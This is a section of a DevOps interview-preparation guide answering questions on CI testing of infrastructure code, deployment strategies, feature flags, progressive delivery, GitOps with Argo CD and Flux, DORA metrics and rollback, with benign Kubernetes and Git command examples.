### Q178. How do you test infrastructure code in CI (Terraform, Helm, Kubernetes manifests)? 🟡

<details>
<summary><b>Answer</b></summary>

Layered checks: formatting and syntax (`terraform fmt -check`, `terraform validate`, `helm lint`), schema validation (`kubeconform`), policy as code (Conftest/OPA, Checkov, Kyverno CLI), security scanning (`tfsec`/`trivy config`), a `terraform plan` posted to the PR, and for important modules integration tests (Terratest or `terraform test`) in a sandbox account.

</details>

### Q179. What is mutation testing? 🔴

<details>
<summary><b>Answer</b></summary>

A mutation testing tool (PIT for Java, Stryker for JS/.NET, mutmut for Python) makes small changes to the code (flip `>` to `>=`, remove a call) and reruns the tests; if tests still pass, the mutant "survived", exposing weak tests. The mutation score is a better quality measure than coverage but is expensive, so run it on changed modules or nightly.

</details>

### Q180. What is the difference between shift-left testing and testing in production? 🔴

<details>
<summary><b>Answer</b></summary>

Shift-left tests before release: unit, integration and staging checks. Testing in production accepts that some failures only appear with real traffic and data, so you add controlled techniques: canary releases, synthetic monitoring, feature flags, traffic shadowing/mirroring, and chaos experiments, all with automated rollback and observability. They complement each other; production testing without strong pre-prod checks is reckless, and pre-prod checks alone miss real-world behaviour.

</details>

## Deployment Strategies and GitOps

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q181. What is a rolling deployment? 🟢

<details>
<summary><b>Answer</b></summary>

A rolling deployment replaces instances of the old version with the new one gradually, a few at a time, so capacity is maintained and there is no downtime. It is the Kubernetes Deployment default. Rollback is another rolling update in reverse. Downsides: old and new versions serve traffic simultaneously (so they must be compatible), and rollback takes as long as rollout.

```yaml
strategy:
  type: RollingUpdate
  rollingUpdate: { maxSurge: 25%, maxUnavailable: 0 }
```

</details>

### Q182. What is blue-green deployment? 🟢

<details>
<summary><b>Answer</b></summary>

You keep two identical environments: blue (live) and green (idle). Deploy and test the new version on green, then switch traffic by changing the load balancer, DNS or a Kubernetes Service selector. Rollback is switching back. Benefits: instant cutover and rollback with full pre-production verification. Costs: double the infrastructure during the release, and database schema changes must work with both versions.

```bash
kubectl patch service shop -p '{"spec":{"selector":{"app":"shop","version":"green"}}}'
```

</details>

### Q183. What is a canary deployment? 🟡

<details>
<summary><b>Answer</b></summary>

A canary sends a small percentage of real traffic (1%, 5%, 25%...) to the new version while the rest stays on the stable one, and promotes it progressively if metrics (error rate, latency, saturation, business KPIs) stay healthy. It limits blast radius and tests with real traffic. It needs traffic-splitting capability (service mesh, ingress controller, ALB weighted target groups, Argo Rollouts, Flagger) and good monitoring to decide automatically.

</details>

### Q184. Compare rolling, blue-green and canary deployments. 🟡

<details>
<summary><b>Answer</b></summary>

| | Rolling | Blue-green | Canary |
|---|---|---|---|
| Extra capacity | Small surge | Full duplicate | Small slice |
| Rollback speed | Slow (rollout reversed) | Instant switch | Fast (shift weight to 0) |
| Risk exposure | Gradual, uncontrolled split | None until the switch, then 100% | Controlled percentage |
| Complexity | Low | Medium | High (metrics and routing) |

Choose rolling for most stateless services, blue-green when instant rollback and pre-switch validation matter, and canary for high-traffic or high-risk changes where you want metric-driven promotion.

</details>

### Q185. What is a recreate deployment and when is it acceptable? 🟢

<details>
<summary><b>Answer</b></summary>

Recreate stops all old instances, then starts the new ones, causing downtime. It is acceptable for batch jobs, internal tools, dev environments, or apps that cannot run two versions at once (exclusive database locks or incompatible schema), or when downtime windows are agreed. In Kubernetes: `strategy.type: Recreate`.

</details>

### Q186. What are feature flags and what types exist? 🟡

<details>
<summary><b>Answer</b></summary>

Feature flags are runtime conditionals (`if flags.isEnabled("new-checkout", user)`) controlled outside the code deployment, via LaunchDarkly, Unleash, Flagsmith, OpenFeature-compatible providers, or a config store. Types: **release flags** (short-lived, hide unfinished work), **experiment flags** (A/B tests), **ops flags/kill switches** (turn off expensive features under load), and **permission flags** (entitlements). Remove release flags promptly after rollout to avoid dead branches.

</details>

### Q187. What is progressive delivery and which tools implement it on Kubernetes? 🔴

<details>
<summary><b>Answer</b></summary>

Progressive delivery is the practice of releasing gradually with automated analysis and rollback: canary steps, metric checks, and flags. On Kubernetes: **Argo Rollouts** (a `Rollout` CRD replacing Deployment, with canary/blue-green steps and `AnalysisTemplate` queries to Prometheus) and **Flagger** (works with Istio, Linkerd, NGINX, Gateway API and automates canary analysis). Both promote or abort based on SLI thresholds such as success rate and p99 latency.

```yaml
strategy:
  canary:
    steps:
      - setWeight: 10
      - pause: { duration: 5m }
      - analysis: { templates: [{ templateName: success-rate }] }
      - setWeight: 50
      - pause: { duration: 10m }
```

</details>

### Q188. What is GitOps? 🟢

<details>
<summary><b>Answer</b></summary>

GitOps uses Git as the single source of truth for the desired state of infrastructure and applications. Changes are made by pull request; an in-cluster agent (Argo CD or Flux) continuously compares the live cluster against Git and reconciles drift. You get audit history, easy rollback (`git revert`), and no cluster credentials in your CI system.

</details>

### Q189. What is the difference between push-based CD and pull-based GitOps? 🟡

<details>
<summary><b>Answer</b></summary>

**Push**: the CI/CD pipeline holds cluster credentials and runs `kubectl apply` or `helm upgrade` against the cluster. **Pull**: an agent inside the cluster pulls manifests from Git and applies them, so the pipeline only builds the image and updates a Git repo (image tag), and the cluster credentials never leave the cluster. Pull is better for security, drift detection and multi-cluster consistency; push is simpler for small setups and non-Kubernetes targets.

</details>

### Q190. How does Argo CD work and what is an Application? 🟡

<details>
<summary><b>Answer</b></summary>

Argo CD runs in the cluster, watches Git repos, renders manifests (plain YAML, Helm, Kustomize), compares them to live state, and reports **Synced/OutOfSync** and **Healthy/Degraded**. An `Application` custom resource links a source (repo, path, revision) to a destination (cluster, namespace) and a sync policy. With `automated: { prune: true, selfHeal: true }` it applies changes and reverts manual drift.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: { name: shop-api, namespace: argocd }
spec:
  project: default
  source:
    repoURL: https://github.com/acme/deploy-config
    targetRevision: main
    path: apps/shop-api/overlays/prod
  destination: { server: https://kubernetes.default.svc, namespace: shop }
  syncPolicy:
    automated: { prune: true, selfHeal: true }
```

</details>

### Q191. How does Flux differ from Argo CD? 🔴

<details>
<summary><b>Answer</b></summary>

Both are CNCF-graduated GitOps tools. Flux is a set of composable controllers (source-controller, kustomize-controller, helm-controller, notification-controller, image-automation controllers) configured with CRDs (`GitRepository`, `Kustomization`, `HelmRelease`) and has no built-in UI. Argo CD is a more monolithic app with a rich web UI, SSO/RBAC, ApplicationSets and a CLI. Flux suits platform teams who want Kubernetes-native building blocks; Argo CD suits teams who value visibility and multi-tenant UI access. Both support image update automation and drift correction.

</details>

### Q192. How does a CI pipeline hand off to GitOps? 🟡

<details>
<summary><b>Answer</b></summary>

CI builds, tests and pushes the image, then updates the deployment repo (separate from the app repo) with the new tag via a commit or PR (using `kustomize edit set image`, `yq`, or Flux/Argo Image Updater). The GitOps controller sees the change and deploys. Production promotion is a PR from the staging overlay to the prod overlay, reviewed and merged.

```bash
cd deploy-config/apps/shop-api/overlays/staging
kustomize edit set image shop-api=registry.example.com/shop/api:${GIT_SHA}
git commit -am "shop-api: staging -> ${GIT_SHA}" && git push
```

</details>

### Q193. What is configuration drift and how does GitOps handle it? 🟡

<details>
<summary><b>Answer</b></summary>

Drift is when live infrastructure differs from the declared definition, because someone ran `kubectl edit` or changed a console setting. GitOps controllers continuously diff desired and live state; with self-heal they revert the manual change, and without it they flag the app as OutOfSync and alert. The fix for drift is always through Git, so the audit trail stays accurate.

</details>

### Q194. What is the difference between Kustomize and Helm for environment configuration? 🟡

<details>
<summary><b>Answer</b></summary>

**Helm** templates manifests with Go templating and values files, and packages them as versioned charts with releases and hooks. **Kustomize** (built into `kubectl -k`) patches plain YAML with bases and overlays, no templating language. Teams often use Helm for third-party/packaged software and Kustomize overlays for their own per-environment differences, or Helm for both with a values file per environment.

</details>

### Q195. What are Kubernetes deployment health gates: readiness probes, `maxUnavailable` and `progressDeadlineSeconds`? 🔴

<details>
<summary><b>Answer</b></summary>

A rollout only advances when new pods become **Ready** (readiness probe passing), and `maxUnavailable: 0` ensures old pods are not removed until replacements are ready. If new pods never become ready, the Deployment reports `ProgressDeadlineExceeded` after `progressDeadlineSeconds` (default 600), but it does not roll back by itself; the pipeline should detect it.

```bash
kubectl rollout status deployment/api --timeout=300s || {
  kubectl rollout undo deployment/api; exit 1; }
```

A bad readiness probe (always true) defeats the entire safety mechanism, so it must test real dependencies lightly.

</details>

### Q196. What is an immutable infrastructure approach to deployment? 🟡

<details>
<summary><b>Answer</b></summary>

Servers and containers are never patched in place. A change produces a new image (AMI, container image) which replaces the running instances. This removes configuration drift, makes environments reproducible, and makes rollback just redeploying the previous image. Tools: Packer for AMIs, Docker images, Auto Scaling group instance refresh.

</details>

### Q197. What is a dark launch and what is traffic shadowing? 🔴

<details>
<summary><b>Answer</b></summary>

A **dark launch** deploys a feature to production but does not expose it to users (feature flag off or no UI), so you can warm caches and verify behaviour under load. **Traffic shadowing (mirroring)** copies live requests to a new version in parallel and discards its responses, comparing outputs and latency without user impact. Istio and NGINX support mirroring; take care with side effects (do not let the shadow write to production databases or send emails).

</details>

### Q198. What are DORA metrics? 🟢

<details>
<summary><b>Answer</b></summary>

The DORA metrics measure software delivery performance: **deployment frequency**, **lead time for changes** (commit to production), **change failure rate** (percent of deployments causing a failure needing remediation), and **time to restore service** (formerly MTTR; the 2024 report renamed it "failed deployment recovery time"). Throughput (frequency, lead time) and stability (failure rate, recovery time) are tracked together, because speed without stability is not performance.

</details>

### Q199. What does a deployment approval gate look like in each CI system? 🟡

<details>
<summary><b>Answer</b></summary>

- **Jenkins**: `input` step with `submitter`.
- **GitHub Actions**: job with `environment: production` that has required reviewers.
- **GitLab CI**: `when: manual` job, or protected environments with approval rules.

Approval gates should show what is being deployed (diff, commit list, test results) and be restricted to named approvers, with a timeout. Many teams drop manual gates for low-risk services in favour of automated checks and progressive rollout.

</details>

### Q200. How do you roll back a GitOps deployment and what are the caveats? 🔴

<details>
<summary><b>Answer</b></summary>

Rollback is `git revert` of the offending commit in the config repo; the controller then reconciles the cluster to the previous state, keeping the audit trail intact. With Argo CD the CLI command `argocd app rollback` only works if auto-sync is disabled (otherwise the controller immediately re-syncs to Git), so it is a temporary emergency tool, not the proper fix.

Caveats: database migrations and stateful data are not rolled back by Git, secrets rotated since the last release may have changed, and CRD changes may need ordering. Prefer reverting through Git and let the pipeline run its checks.

```bash
git revert --no-edit <bad-commit> && git push origin main
argocd app wait shop-api --health --timeout 300
```

</details>

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
